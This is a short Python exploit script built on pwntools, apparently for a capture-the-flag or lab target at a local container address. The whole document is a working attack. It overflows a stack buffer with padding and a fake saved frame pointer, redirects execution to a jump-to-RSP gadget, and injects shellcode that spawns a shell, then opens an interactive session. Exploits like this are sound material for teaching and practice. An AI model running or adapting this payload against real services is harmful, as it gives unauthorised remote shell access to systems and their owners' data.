from pwn import *

HOST = "172.17.0.2"
PORT = 9000
JMPRSP_ADDR = 0x40120d

context.os = 'linux'
context.arch = 'amd64'

payload  = b"A"*32
payload += b"RBP4RBP8"
payload += p64(JMPRSP_ADDR)
payload += asm(shellcraft.sh())

r = remote(HOST, PORT)
r.recvuntil(b"do: ")
r.sendline(payload)
r.interactive()
